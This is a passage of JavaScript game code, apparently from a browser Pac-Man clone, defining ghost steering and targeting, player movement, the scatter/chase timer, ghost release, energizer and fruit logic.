        (this.faceDirEnum = this.savedFaceDirEnum[t]),
        Actor.prototype.load.call(this, t);
    }),
    (Ghost.prototype.isSlowInTunnel = function () {
      return (1 != gameMode && 3 != gameMode && 2 != gameMode) || level <= 3;
    }),
    (Ghost.prototype.getNumSteps = function () {
      var pattern = 1;
      return this.mode == GHOST_GOING_HOME || this.mode == GHOST_ENTERING_HOME
        ? 2
        : 5 == this.mode || 4 == this.mode
        ? this.getStepSizeFromTable(1, 4)
        : (map.isTunnelTile(this.tile.x, this.tile.y) && this.isSlowInTunnel()
            ? (pattern = 4)
            : this.scared
            ? (pattern = 3)
            : 1 == this.elroy
            ? (pattern = 5)
            : 2 == this.elroy && (pattern = 6),
          this.getStepSizeFromTable(level || 1, pattern));
    }),
    (Ghost.prototype.reverse = function () {
      this.sigReverse = !0;
    }),
    (Ghost.prototype.goHome = function () {
      audio.silence(), audio.eatingGhost.play(), (this.mode = GHOST_EATEN);
    }),
    (Ghost.prototype.leaveHome = function () {
      this.playSounds(), (this.sigLeaveHome = !0);
    }),
    (Ghost.prototype.playSounds = function () {
      for (var ghostsOutside = 0, ghostsGoingHome = 0, i = 0; i < 4; i++)
        0 == ghosts[i].mode && ghostsOutside++,
          ghosts[i].mode == GHOST_GOING_HOME && ghostsGoingHome++;
      if (ghostsGoingHome > 0)
        return (
          audio.ghostNormalMove.stopLoop(),
          void audio.ghostReturnToHome.startLoop(!0)
        );
      audio.ghostReturnToHome.stopLoop(),
        ghostsOutside > 0
          ? this.scared || audio.ghostNormalMove.startLoop(!0)
          : audio.ghostNormalMove.stopLoop();
    }),
    (Ghost.prototype.onEnergized = function () {
      this.reverse(),
        this.mode != GHOST_GOING_HOME &&
          this.mode != GHOST_ENTERING_HOME &&
          ((this.scared = !0), (this.targetting = void 0));
    }),
    (Ghost.prototype.onEaten = function () {
      this.goHome(), (this.scared = !1);
    }),
    (Ghost.prototype.step = function () {
      return (
        this.setPos(this.pixel.x + this.dir.x, this.pixel.y + this.dir.y), 1
      );
    }),
    (Ghost.prototype.homeSteer =
      (((steerFuncs = {})[GHOST_GOING_HOME] = function () {
        this.tile.x == map.doorTile.x &&
          this.tile.y == map.doorTile.y &&
          ((this.faceDirEnum = 2),
          (this.targetting = !1),
          this.pixel.x == map.doorPixel.x
            ? ((this.mode = GHOST_ENTERING_HOME),
              this.playSounds(),
              this.setDir(2),
              (this.faceDirEnum = this.dirEnum))
            : (this.setDir(3), (this.faceDirEnum = this.dirEnum)));
      }),
      (steerFuncs[GHOST_ENTERING_HOME] = function () {
        this.pixel.y == map.homeBottomPixel &&
          (this.pixel.x == this.startPixel.x
            ? (this.setDir(0), (this.mode = this.arriveHomeMode))
            : this.setDir(this.startPixel.x < this.pixel.x ? 1 : 3),
          (this.faceDirEnum = this.dirEnum));
      }),
      (steerFuncs[4] = function () {
        this.sigLeaveHome
          ? ((this.sigLeaveHome = !1),
            (this.mode = 5),
            this.pixel.x == map.doorPixel.x
              ? this.setDir(0)
              : this.setDir(this.pixel.x < map.doorPixel.x ? 3 : 1))
          : this.pixel.y == map.homeTopPixel
          ? this.setDir(2)
          : this.pixel.y == map.homeBottomPixel && this.setDir(0),
          (this.faceDirEnum = this.dirEnum);
      }),
      (steerFuncs[5] = function () {
        this.pixel.x == map.doorPixel.x &&
          (this.pixel.y == map.doorPixel.y
            ? ((this.mode = 0), this.setDir(1))
            : this.setDir(0),
          (this.faceDirEnum = this.dirEnum));
      }),
      function () {
        var f = steerFuncs[this.mode];
        f && f.apply(this);
      })),
    (Ghost.prototype.isScatterBrain = function () {
      var scatter = !1;
      return (
        ghostCommander.getCommand() == GHOST_CMD_SCATTER &&
          (1 == gameMode || 2 == gameMode
            ? (scatter = this == blinky || this == pinky)
            : 3 == gameMode && (scatter = !0)),
        scatter
      );
    }),
    (Ghost.prototype.steer = function () {
      var dirEnum,
        openTiles,
        actor,
        oppDirEnum = rotateAboutFace(this.dirEnum);
      if (
        (this.homeSteer(),
        (oppDirEnum = rotateAboutFace(this.dirEnum)),
        0 == this.mode || this.mode == GHOST_GOING_HOME)
      ) {
        if (0 == this.distToMid.x && 0 == this.distToMid.y)
          this.sigReverse &&
            ((this.faceDirEnum = oppDirEnum), (this.sigReverse = !1)),
            this.setDir(this.faceDirEnum);
        else if (
          (3 == this.dirEnum && this.tilePixel.x == midTile_x + 1) ||
          (1 == this.dirEnum && this.tilePixel.x == midTile_x - 1) ||
          (0 == this.dirEnum && this.tilePixel.y == midTile_y - 1) ||
          (2 == this.dirEnum && this.tilePixel.y == midTile_y + 1)
        ) {
          var nextTile = {
            x: this.tile.x + this.dir.x,
            y: this.tile.y + this.dir.y,
          };
          if (
            ((openTiles = getOpenTiles(nextTile, this.dirEnum)), this.scared)
          ) {
            for (dirEnum = Math.floor(4 * Math.random()); !openTiles[dirEnum]; )
              dirEnum = (dirEnum + 1) % 4;
            this.targetting = !1;
          } else {
            this.mode == GHOST_GOING_HOME
              ? ((this.targetTile.x = map.doorTile.x),
                (this.targetTile.y = map.doorTile.y))
              : this.elroy || ghostCommander.getCommand() != GHOST_CMD_SCATTER
              ? this.setTarget()
              : ((actor = this.isScatterBrain()
                  ? actors[Math.floor(4 * Math.random())]
                  : this),
                (this.targetTile.x = actor.cornerTile.x),
                (this.targetTile.y = actor.cornerTile.y),
                (this.targetting = "corner"));
            var dirDecided = !1;
            if (this.mode == GHOST_GOING_HOME && map.getExitDir) {
              var exitDir = map.getExitDir(nextTile.x, nextTile.y);
              null != exitDir &&
                exitDir != oppDirEnum &&
                ((dirDecided = !0), (dirEnum = exitDir));
            }
            dirDecided ||
              (this.mode != GHOST_GOING_HOME &&
                map.constrainGhostTurns &&
                map.constrainGhostTurns(nextTile, openTiles, this.dirEnum),
              (dirEnum = getTurnClosestToTarget(
                nextTile,
                this.targetTile,
                openTiles
              )));
          }
          this.faceDirEnum = dirEnum;
        }
      } else this.targetting = !1;
    }),
    (Ghost.prototype.getPathDistLeft = function (fromPixel, dirEnum) {
      var distLeft = 8,
        pixel = this.getTargetPixel();
      return (
        "pacman" == this.targetting &&
          (distLeft =
            0 == dirEnum || 2 == dirEnum
              ? Math.abs(fromPixel.y - pixel.y)
              : Math.abs(fromPixel.x - pixel.x)),
        distLeft
      );
    }),
    (Ghost.prototype.setTarget = function () {
      (this.targetTile = this.getTargetTile()),
        this != clyde && (this.targetting = "pacman");
    });
  var Player = function () {
    Actor.apply(this),
      (1 != gameMode && 2 != gameMode) || (this.frames = 1),
      (this.nextDir = {}),
      (this.lastMeal = {
        x: -1,
        y: -1,
      }),
      (this.ai = !1),
      (this.invincible = !1),
      (this.savedNextDirEnum = {}),
      (this.savedStopped = {}),
      (this.savedEatPauseFramesLeft = {});
  };
  ((Player.prototype = newChildObject(Actor.prototype)).save = function (t) {
    (this.savedEatPauseFramesLeft[t] = this.eatPauseFramesLeft),
      (this.savedNextDirEnum[t] = this.nextDirEnum),
      (this.savedStopped[t] = this.stopped),
      Actor.prototype.save.call(this, t);
  }),
    (Player.prototype.load = function (t) {
      (this.eatPauseFramesLeft = this.savedEatPauseFramesLeft[t]),
        this.setNextDir(this.savedNextDirEnum[t]),
        (this.stopped = this.savedStopped[t]),
        Actor.prototype.load.call(this, t);
    }),
    (Player.prototype.reset = function () {
      this.setNextDir(this.startDirEnum),
        (this.stopped = !1),
        (this.inputDirEnum = void 0),
        (this.eatPauseFramesLeft = 0),
        Actor.prototype.reset.apply(this);
    }),
    (Player.prototype.setNextDir = function (nextDirEnum) {
      setDirFromEnum(this.nextDir, nextDirEnum),
        (this.nextDirEnum = nextDirEnum);
    }),
    (Player.prototype.getNumSteps = function () {
      if (turboMode) return 2;
      var pattern = energizer.isActive() ? 2 : 0;
      return this.getStepSizeFromTable(level, pattern);
    }),
    (Player.prototype.getStepFrame = function (steps) {
      return null == steps && (steps = this.steps), Math.floor(steps / 2) % 4;
    }),
    (Player.prototype.getAnimFrame = function (frame) {
      return (
        null == frame && (frame = this.getStepFrame()),
        (1 != gameMode && 2 != gameMode) ||
          ((frame = (frame + 1) % 4), state == deadState && (frame = 1)),
        3 != gameMode && 3 == frame && (frame = 1),
        frame
      );
    }),
    (Player.prototype.setInputDir = function (dirEnum) {
      this.inputDirEnum = dirEnum;
    }),
    (Player.prototype.clearInputDir = function (dirEnum) {
      (null != dirEnum && this.inputDirEnum != dirEnum) ||
        (this.inputDirEnum = void 0);
    }),
    (Player.prototype.step = function () {
      if (!map)
        return (
          this.setPos(this.pixel.x + this.dir.x, this.pixel.y + this.dir.y), 1
        );
      var x,
        a = 0 != this.dir.x ? "x" : "y",
        b = 0 != this.dir.x ? "y" : "x";
      return (
        (this.stopped =
          this.stopped ||
          (0 == this.distToMid[a] && !isNextTileFloor(this.tile, this.dir))),
        this.stopped ||
          ((this.pixel[a] += this.dir[a]),
          (this.pixel[b] += (x = this.distToMid[b]) < 0 ? -1 : x > 0 ? 1 : 0)),
        this.commitPos(),
        this.stopped ? 0 : 1
      );
    }),
    (Player.prototype.steer = function () {
      if (this.ai) {
        if (0 != this.distToMid.x || 0 != this.distToMid.y) return;
        var openTiles = getOpenTiles(this.tile, this.dirEnum);
        this.setTarget(),
          this.setNextDir(
            getTurnClosestToTarget(this.tile, this.targetTile, openTiles)
          );
      } else this.targetting = void 0;
      if (null == this.inputDirEnum)
        this.stopped && this.setDir(this.nextDirEnum);
      else {
        var inputDir = {};
        setDirFromEnum(inputDir, this.inputDirEnum),
          isNextTileFloor(this.tile, inputDir)
            ? (this.setDir(this.inputDirEnum),
              this.setNextDir(this.inputDirEnum),
              (this.stopped = !1))
            : this.stopped || this.setNextDir(this.inputDirEnum);
      }
      this.stopped && audio.eating.stopLoop(!0);
    }),
    (Player.prototype.update = function (j) {
      var numSteps = this.getNumSteps();
      if (!(j >= numSteps))
        if (this.eatPauseFramesLeft > 0)
          j == numSteps - 1 && this.eatPauseFramesLeft--;
        else if ((Actor.prototype.update.call(this, j), map)) {
          var t = map.getTile(this.tile.x, this.tile.y);
          ("." != t && "o" != t) ||
            ((this.lastMeal.x = this.tile.x),
            (this.lastMeal.y = this.tile.y),
            turboMode || (this.eatPauseFramesLeft = "." == t ? 1 : 3),
            audio.eating.startLoop(!0),
            map.onDotEat(this.tile.x, this.tile.y),
            ghostReleaser.onDotEat(),
            fruit.onDotEat(),
            addScore("." == t ? 10 : 50),
            "o" == t && energizer.activate()),
            " " != t ||
              (this.lastMeal.x == this.tile.x &&
                this.lastMeal.y == this.tile.y) ||
              audio.eating.stopLoop(!0);
        }
    });
  var blinky = new Ghost();
  (blinky.name = "blinky"),
    (blinky.color = "#FF0000"),
    (blinky.pathColor = "rgba(255,0,0,0.8)"),
    (blinky.isVisible = !0);
  var pinky = new Ghost();
  (pinky.name = "pinky"),
    (pinky.color = "#FFB8FF"),
    (pinky.pathColor = "rgba(255,184,255,0.8)"),
    (pinky.isVisible = !0);
  var inky = new Ghost();
  (inky.name = "inky"),
    (inky.color = "#00FFFF"),
    (inky.pathColor = "rgba(0,255,255,0.8)"),
    (inky.isVisible = !0);
  var clyde = new Ghost();
  (clyde.name = "clyde"),
    (clyde.color = "#FFB851"),
    (clyde.pathColor = "rgba(255,184,81,0.8)"),
    (clyde.isVisible = !0);
  var pacman = new Player();
  (pacman.name = "pacman"),
    (pacman.color = "#FFFF00"),
    (pacman.pathColor = "rgba(255,255,0,0.8)");
  var targetSize,
    actors = [blinky, pinky, inky, clyde, pacman],
    ghosts = [blinky, pinky, inky, clyde],
    actorPathLength = 16;
  (targetSize = midTile_y),
    (pacman.pathCenter = {
      x: 0,
      y: 0,
    }),
    (blinky.pathCenter = {
      x: -2,
      y: -2,
    }),
    (pinky.pathCenter = {
      x: -1,
      y: -1,
    }),
    (inky.pathCenter = {
      x: 1,
      y: 1,
    }),
    (clyde.pathCenter = {
      x: 2,
      y: 2,
    }),
    (blinky.getTargetTile = function () {
      return {
        x: pacman.tile.x,
        y: pacman.tile.y,
      };
    }),
    (blinky.getTargetPixel = function () {
      return {
        x: pacman.pixel.x,
        y: pacman.pixel.y,
      };
    }),
    (blinky.drawTarget = function (ctx) {
      this.targetting &&
        ((ctx.fillStyle = this.color),
        "pacman" == this.targetting
          ? renderer.drawCenterPixelSq(
              ctx,
              pacman.pixel.x,
              pacman.pixel.y,
              targetSize
            )
          : renderer.drawCenterTileSq(
              ctx,
              this.targetTile.x,
              this.targetTile.y,
              targetSize
            ));
    }),
    (pinky.getTargetTile = function () {
      var px = pacman.tile.x + 4 * pacman.dir.x,
        py = pacman.tile.y + 4 * pacman.dir.y;
      return (
        0 == pacman.dirEnum && (px -= 4),
        {
          x: px,
          y: py,
        }
      );
    }),
    (pinky.getTargetPixel = function () {
      var px = pacman.pixel.x + 4 * pacman.dir.x * 8,
        py = pacman.pixel.y + 4 * pacman.dir.y * 8;
      return (
        0 == pacman.dirEnum && (px -= 32),
        {
          x: px,
          y: py,
        }
      );
    }),
    (pinky.drawTarget = function (ctx) {
      if (this.targetting) {
        ctx.fillStyle = this.color;
        var pixel = this.getTargetPixel();
        "pacman" == this.targetting
          ? (ctx.beginPath(),
            ctx.moveTo(pacman.pixel.x, pacman.pixel.y),
            0 == pacman.dirEnum && ctx.lineTo(pacman.pixel.x, pixel.y),
            ctx.lineTo(pixel.x, pixel.y),
            ctx.stroke(),
            renderer.drawCenterPixelSq(ctx, pixel.x, pixel.y, targetSize))
          : renderer.drawCenterTileSq(
              ctx,
              this.targetTile.x,
              this.targetTile.y,
              targetSize
            );
      }
    }),
    (inky.getTargetTile = function () {
      var px = pacman.tile.x + 2 * pacman.dir.x,
        py = pacman.tile.y + 2 * pacman.dir.y;
      return (
        0 == pacman.dirEnum && (px -= 2),
        {
          x: blinky.tile.x + 2 * (px - blinky.tile.x),
          y: blinky.tile.y + 2 * (py - blinky.tile.y),
        }
      );
    }),
    (inky.getJointPixel = function () {
      var px = pacman.pixel.x + 2 * pacman.dir.x * 8,
        py = pacman.pixel.y + 2 * pacman.dir.y * 8;
      return (
        0 == pacman.dirEnum && (px -= 16),
        {
          x: px,
          y: py,
        }
      );
    }),
    (inky.getTargetPixel = function () {
      var px = pacman.pixel.x + 2 * pacman.dir.x * 8,
        py = pacman.pixel.y + 2 * pacman.dir.y * 8;
      return (
        0 == pacman.dirEnum && (px -= 16),
        {
          x: blinky.pixel.x + 2 * (px - blinky.pixel.x),
          y: blinky.pixel.y + 2 * (py - blinky.pixel.y),
        }
      );
    }),
    (inky.drawTarget = function (ctx) {
      if (this.targetting) {
        var pixel,
          joint = this.getJointPixel();
        "pacman" == this.targetting
          ? ((pixel = this.getTargetPixel()),
            ctx.beginPath(),
            ctx.moveTo(pacman.pixel.x, pacman.pixel.y),
            0 == pacman.dirEnum && ctx.lineTo(pacman.pixel.x, joint.y),
            ctx.lineTo(joint.x, joint.y),
            ctx.moveTo(blinky.pixel.x, blinky.pixel.y),
            ctx.lineTo(pixel.x, pixel.y),
            ctx.closePath(),
            ctx.stroke(),
            ctx.beginPath(),
            ctx.arc(joint.x, joint.y, 2, 0, 2 * Math.PI),
            (ctx.fillStyle = ctx.strokeStyle),
            ctx.fill(),
            (ctx.fillStyle = this.color),
            renderer.drawCenterPixelSq(ctx, pixel.x, pixel.y, targetSize))
          : ((ctx.fillStyle = this.color),
            renderer.drawCenterTileSq(
              ctx,
              this.targetTile.x,
              this.targetTile.y,
              targetSize
            ));
      }
    }),
    (clyde.getTargetTile = function () {
      var dx = pacman.tile.x - (this.tile.x + this.dir.x),
        dy = pacman.tile.y - (this.tile.y + this.dir.y);
      return dx * dx + dy * dy >= 64
        ? ((this.targetting = "pacman"),
          {
            x: pacman.tile.x,
            y: pacman.tile.y,
          })
        : ((this.targetting = "corner"),
          {
            x: this.cornerTile.x,
            y: this.cornerTile.y,
          });
    }),
    (clyde.getTargetPixel = function () {
      return {
        x: pacman.pixel.x,
        y: pacman.pixel.y,
      };
    }),
    (clyde.drawTarget = function (ctx) {
      this.targetting &&
        ((ctx.fillStyle = this.color),
        "pacman" == this.targetting
          ? (ctx.beginPath(),
            ctx.arc(pacman.pixel.x, pacman.pixel.y, 64, 0, 2 * Math.PI),
            ctx.closePath(),
            ctx.stroke(),
            renderer.drawCenterPixelSq(
              ctx,
              pacman.pixel.x,
              pacman.pixel.y,
              targetSize
            ))
          : (ghostCommander.getCommand() == GHOST_CMD_CHASE &&
              (ctx.beginPath(),
              ctx.arc(pacman.pixel.x, pacman.pixel.y, 64, 0, 2 * Math.PI),
              (ctx.strokeStyle = "rgba(255,255,255,0.25)"),
              ctx.stroke()),
            renderer.drawCenterTileSq(
              ctx,
              this.targetTile.x,
              this.targetTile.y,
              targetSize
            )));
    }),
    (pacman.setTarget = function () {
      blinky.mode == GHOST_GOING_HOME || blinky.scared
        ? ((this.targetTile.x = pinky.tile.x),
          (this.targetTile.y = pinky.tile.y),
          (this.targetting = "pinky"))
        : ((this.targetTile.x =
            pinky.tile.x + 2 * (pacman.tile.x - pinky.tile.x)),
          (this.targetTile.y =
            pinky.tile.y + 2 * (pacman.tile.y - pinky.tile.y)),
          (this.targetting = "flee"));
    }),
    (pacman.drawTarget = function (ctx) {
      var px, py;
      this.ai &&
        ((ctx.fillStyle = this.color),
        "flee" == this.targetting
          ? ((px = pacman.pixel.x - pinky.pixel.x),
            (py = pacman.pixel.y - pinky.pixel.y),
            (px = pinky.pixel.x + 2 * px),
            (py = pinky.pixel.y + 2 * py),
            ctx.beginPath(),
            ctx.moveTo(pinky.pixel.x, pinky.pixel.y),
            ctx.lineTo(px, py),
            ctx.closePath(),
            ctx.stroke(),
            renderer.drawCenterPixelSq(ctx, px, py, targetSize))
          : renderer.drawCenterPixelSq(
              ctx,
              pinky.pixel.x,
              pinky.pixel.y,
              targetSize
            ));
    }),
    (pacman.getPathDistLeft = function (fromPixel, dirEnum) {
      var px,
        py,
        distLeft = 8;
      return (
        "pinky" == this.targetting
          ? (distLeft =
              0 == dirEnum || 2 == dirEnum
                ? Math.abs(fromPixel.y - pinky.pixel.y)
                : Math.abs(fromPixel.x - pinky.pixel.x))
          : ((px = pacman.pixel.x - pinky.pixel.x),
            (py = pacman.pixel.y - pinky.pixel.y),
            (px = pinky.pixel.x + 2 * px),
            (py = pinky.pixel.y + 2 * py),
            (distLeft =
              0 == dirEnum || 2 == dirEnum
                ? Math.abs(py - fromPixel.y)
                : Math.abs(px - fromPixel.x))),
        distLeft
      );
    });
  var frame,
    command,
    getNewCommand,
    savedFrame,
    savedCommand,
    dotsLeft,
    waitForClyde,
    getDotsEatenLimit,
    savedWaitForClyde,
    seconds,
    flashes,
    count,
    active,
    points,
    pointsFramesLeft,
    getDuration,
    getFlashes,
    savedCount,
    savedActive,
    savedPoints,
    savedPointsFramesLeft,
    GHOST_CMD_CHASE = 0,
    GHOST_CMD_SCATTER = 1,
    ghostCommander =
      ((getNewCommand = (function () {
        var t,
          times = [{}, {}, {}];
        return (
          (times[0][(t = 420)] = GHOST_CMD_CHASE),
          (times[0][(t += 1200)] = GHOST_CMD_SCATTER),
          (times[0][(t += 420)] = GHOST_CMD_CHASE),
          (times[0][(t += 1200)] = GHOST_CMD_SCATTER),
          (times[0][(t += 300)] = GHOST_CMD_CHASE),
          (times[0][(t += 1200)] = GHOST_CMD_SCATTER),
          (times[0][(t += 300)] = GHOST_CMD_CHASE),
          (times[1][(t = 420)] = GHOST_CMD_CHASE),
          (times[1][(t += 1200)] = GHOST_CMD_SCATTER),
          (times[1][(t += 420)] = GHOST_CMD_CHASE),
          (times[1][(t += 1200)] = GHOST_CMD_SCATTER),
          (times[1][(t += 300)] = GHOST_CMD_CHASE),
          (times[1][(t += 61980)] = GHOST_CMD_SCATTER),
          (times[1][(t += 1)] = GHOST_CMD_CHASE),
          (times[2][(t = 300)] = GHOST_CMD_CHASE),
          (times[2][(t += 1200)] = GHOST_CMD_SCATTER),
          (times[2][(t += 300)] = GHOST_CMD_CHASE),
          (times[2][(t += 1200)] = GHOST_CMD_SCATTER),
          (times[2][(t += 300)] = GHOST_CMD_CHASE),
          (times[2][(t += 62220)] = GHOST_CMD_SCATTER),
          (times[2][(t += 1)] = GHOST_CMD_CHASE),
          function (frame) {
            var newCmd =
              times[1 == level ? 0 : level >= 2 && level <= 4 ? 1 : 2][frame];
            return 0 == gameMode
              ? newCmd
              : frame <= 1620 && null != newCmd
              ? GHOST_CMD_CHASE
              : void 0;
          }
        );
      })()),
      (savedFrame = {}),
      (savedCommand = {}),
      {
        save: function (t) {
          (savedFrame[t] = frame), (savedCommand[t] = command);
        },
        load: function (t) {
          (frame = savedFrame[t]), (command = savedCommand[t]);
        },
        reset: function () {
          (command = GHOST_CMD_SCATTER), (frame = 0);
        },
        update: function () {
          var newCmd;
          if (!energizer.isActive()) {
            if (null != (newCmd = getNewCommand(frame)))
              for (command = newCmd, i = 0; i < 4; i++) ghosts[i].reverse();
            frame++;
          }
        },
        getCommand: function () {
          return command;
        },
        setCommand: function (cmd) {
          command = cmd;
        },
      }),
    ghostReleaser = (function () {
      var framesSinceLastDot,
        mode,
        personalDotLimit = {
          1: function () {
            return 0;
          },
          2: function () {
            return 1 == level ? 30 : 0;
          },
          3: function () {
            return 1 == level ? 60 : 2 == level ? 50 : 0;
          },
        },
        globalDotLimit = {};
      (globalDotLimit[1] = 7),
        (globalDotLimit[2] = 17),
        (globalDotLimit[3] = 32);
      var globalCount,
        ghostCounts = {},
        savedGlobalCount = {},
        savedFramesSinceLastDot = {},
        savedGhostCounts = {};
      return {
        save: function (t) {
          (savedFramesSinceLastDot[t] = framesSinceLastDot),
            1 == mode
              ? (savedGlobalCount[t] = globalCount)
              : 0 == mode &&
                ((savedGhostCounts[t] = {}),
                (savedGhostCounts[t][1] = ghostCounts[1]),
                (savedGhostCounts[t][2] = ghostCounts[2]),
                (savedGhostCounts[t][3] = ghostCounts[3]));
        },
        load: function (t) {
          (framesSinceLastDot = savedFramesSinceLastDot[t]),
            1 == mode
              ? (globalCount = savedGlobalCount[t])
              : 0 == mode &&
                ((ghostCounts[1] = savedGhostCounts[t][1]),
                (ghostCounts[2] = savedGhostCounts[t][2]),
                (ghostCounts[3] = savedGhostCounts[t][3]));
        },
        onNewLevel: function () {
          (mode = 0),
            (framesSinceLastDot = 0),
            (ghostCounts[1] = 0),
            (ghostCounts[2] = 0),
            (ghostCounts[3] = 0);
        },
        onRestartLevel: function () {
          (mode = 1), (framesSinceLastDot = 0), (globalCount = 0);
        },
        onDotEat: function () {
          var i;
          if (((framesSinceLastDot = 0), 1 == mode)) globalCount++;
          else
            for (i = 1; i < 4; i++)
              if (4 == ghosts[i].mode) {
                ghostCounts[i]++;
                break;
              }
        },
        update: function () {
          var g;
          if (0 == mode) {
            for (i = 1; i < 4; i++)
              if (4 == (g = ghosts[i]).mode) {
                if (ghostCounts[i] >= personalDotLimit[i]())
                  return void g.leaveHome();
                break;
              }
          } else if (1 == mode) {
            if (globalCount == globalDotLimit[1] && 4 == pinky.mode)
              return void pinky.leaveHome();
            if (globalCount == globalDotLimit[2] && 4 == inky.mode)
              return void inky.leaveHome();
            if (globalCount == globalDotLimit[3] && 4 == clyde.mode)
              return (globalCount = 0), (mode = 0), void clyde.leaveHome();
          }
          if (framesSinceLastDot > (level < 5 ? 240 : 180)) {
            for (framesSinceLastDot = 0, i = 1; i < 4; i++)
              if (4 == (g = ghosts[i]).mode) {
                g.leaveHome();
                break;
              }
          } else framesSinceLastDot++;
        },
      };
    })(),
    elroyTimer =
      ((dotsLeft = [
        [
          20, 30, 40, 40, 40, 50, 50, 50, 60, 60, 60, 70, 70, 70, 100, 100, 100,
          100, 120, 120, 120,
        ],
        [
          10, 15, 20, 20, 20, 25, 25, 25, 30, 30, 30, 40, 40, 40, 50, 50, 50,
          50, 60, 60, 60,
        ],
      ]),
      (getDotsEatenLimit = function (stage) {
        var i = level;
        return i > 21 && (i = 21), 244 - dotsLeft[stage - 1][i - 1];
      }),
      (savedWaitForClyde = {}),
      {
        onNewLevel: function () {
          waitForClyde = !1;
        },
        onRestartLevel: function () {
          waitForClyde = !0;
        },
        update: function () {
          waitForClyde && 4 != clyde.mode && (waitForClyde = !1),
            waitForClyde
              ? (blinky.elroy = 0)
              : map.dotsEaten >= getDotsEatenLimit(2)
              ? (blinky.elroy = 2)
              : map.dotsEaten >= getDotsEatenLimit(1)
              ? (blinky.elroy = 1)
              : (blinky.elroy = 0);
        },
        save: function (t) {
          savedWaitForClyde[t] = waitForClyde;
        },
        load: function (t) {
          waitForClyde = savedWaitForClyde[t];
        },
      }),
    energizer =
      ((seconds = [6, 5, 4, 3, 2, 5, 2, 2, 1, 5, 2, 1, 1, 3, 1, 1, 0, 1]),
      (getDuration = function () {
        return level > 18 ? 0 : 60 * seconds[level - 1];
      }),
      (flashes = [5, 5, 5, 5, 5, 5, 5, 5, 3, 5, 5, 3, 3, 5, 3, 3, 0, 3]),
      (getFlashes = function () {
        return level > 18 ? 0 : flashes[level - 1];
      }),
      (savedCount = {}),
      (savedActive = {}),
      (savedPoints = {}),
      (savedPointsFramesLeft = {}),
      {
        save: function (t) {
          (savedCount[t] = count),
            (savedActive[t] = active),
            (savedPoints[t] = points),
            (savedPointsFramesLeft[t] = pointsFramesLeft);
        },
        load: function (t) {
          (count = savedCount[t]),
            (active = savedActive[t]),
            (points = savedPoints[t]),
            (pointsFramesLeft = savedPointsFramesLeft[t]);
        },
        reset: function () {
          for (
            audio.ghostTurnToBlue.stopLoop(),
              count = 0,
              active = !1,
              points = 100,
              pointsFramesLeft = 0,
              i = 0;
            i < 4;
            i++
          )
            ghosts[i].scared = !1;
        },
        update: function () {
          active && (count == getDuration() ? this.reset() : count++);
        },
        activate: function () {
          for (
            audio.ghostNormalMove.stopLoop(),
              audio.ghostTurnToBlue.startLoop(),
              active = !0,
              count = 0,
              points = 100,
              i = 0;
            i < 4;
            i++
          )
            ghosts[i].onEnergized();
          0 == getDuration() && this.reset();
        },
        isActive: function () {
          return active;
        },
        isFlash: function () {
          var i = Math.floor((getDuration() - count) / 14);
          return i <= 2 * getFlashes() - 1 && i % 2 == 0;
        },
        getPoints: function () {
          return points;
        },
        addPoints: function () {
          addScore((points *= 2)), (pointsFramesLeft = 60);
        },
        showingPoints: function () {
          return pointsFramesLeft > 0;
        },
        updatePointsTimer: function () {
          pointsFramesLeft > 0 && pointsFramesLeft--;
        },
      }),
    BaseFruit = function () {
      (this.pixel = {
        x: 0,
        y: 0,
      }),
        (this.fruitHistory = {}),
        (this.scoreDuration = 2),
        this.scoreFramesLeft,
        (this.savedScoreFramesLeft = {});
    };
  BaseFruit.prototype = {
    isScorePresent: function () {
      return this.scoreFramesLeft > 0;
    },
    onNewLevel: function () {
      this.buildFruitHistory();
    },
    setCurrentFruit: function (i) {
      this.currentFruitIndex = i;
    },
    onDotEat: function () {
      this.isPresent() ||
        (map.dotsEaten != this.dotLimit1 && map.dotsEaten != this.dotLimit2) ||
        this.initiate();
    },
    save: function (t) {
      this.savedScoreFramesLeft[t] = this.scoreFramesLeft;
    },
    load: function (t) {
      this.scoreFramesLeft = this.savedScoreFramesLeft[t];
    },
    reset: function () {
      this.scoreFramesLeft = 0;
    },
    getCurrentFruit: function () {
      return this.fruits[this.currentFruitIndex];
    },
    getPoints: function () {
      return this.getCurrentFruit().points;
    },
    update: function () {
      this.scoreFramesLeft > 0 && this.scoreFramesLeft--;
    },
    isCollide: function () {
      return (
        Math.abs(pacman.pixel.y - this.pixel.y) <= midTile_y &&
        Math.abs(pacman.pixel.x - this.pixel.x) <= midTile_x
      );
    },
    testCollide: function () {
      this.isPresent() &&
        this.isCollide() &&
        (addScore(this.getPoints()),
        audio.silence(!0),
        audio.eatingFruit.play(),
        setTimeout(ghosts[0].playSounds, 500),
        this.reset(),
        (this.scoreFramesLeft = 60 * this.scoreDuration));
    },
  };
  var PacFruit = function () {
    BaseFruit.call(this),
      (this.fruits = [
        {
          name: "cherry",
          points: 100,
        },
        {
          name: "strawberry",
          points: 300,
        },
        {
          name: "orange",
          points: 500,
        },
        {
          name: "apple",
          points: 700,
        },
        {
          name: "melon",
          points: 1e3,
        },
        {
          name: "galaxian",
          points: 2e3,
        },
        {
          name: "bell",
          points: 3e3,
        },
        {
          name: "key",
          points: 5e3,
        },
      ]),
      (this.order = [0, 1, 2, 2, 3, 3, 4, 4, 5, 5, 6, 6, 7]),
      (this.dotLimit1 = 70),
      (this.dotLimit2 = 170),
      (this.duration = 9),
      this.framesLeft,
      (this.savedFramesLeft = {});
  };
  PacFruit.prototype = newChildObject(BaseFruit.prototype, {
    onNewLevel: function () {
      this.setCurrentFruit(this.getFruitIndexFromLevel(level)),
        BaseFruit.prototype.onNewLevel.call(this);
    },
    getFruitFromLevel: function (i) {
      return this.fruits[this.getFruitIndexFromLevel(i)];
    },
    getFruitIndexFromLevel: function (i) {
      return i > 13 && (i = 13), this.order[i - 1];
    },
    buildFruitHistory: function () {
      var i;
      for (this.fruitHistory = {}, i = 1; i <= level; i++)
        this.fruitHistory[i] = this.fruits[this.getFruitIndexFromLevel(i)];
    },
    initiate: function () {
      (this.pixel.x = 111),
        (this.pixel.y = 160 + midTile_y),
        (this.framesLeft = 60 * this.duration);
    },
    isPresent: function () {
      return this.framesLeft > 0;
    },
    reset: function () {
      BaseFruit.prototype.reset.call(this), (this.framesLeft = 0);
    },
    update: function () {
      BaseFruit.prototype.update.call(this),
        this.framesLeft > 0 && this.framesLeft--;
    },
    save: function (t) {
      BaseFruit.prototype.save.call(this, t),
        (this.savedFramesLeft[t] = this.framesLeft);
    },
    load: function (t) {
      BaseFruit.prototype.load.call(this, t),
        (this.framesLeft = this.savedFramesLeft[t]);
    },
  });
  var U,
    D,
    L,
    R,
    UL,
    UR,
    DL,
    DR,
    Z,
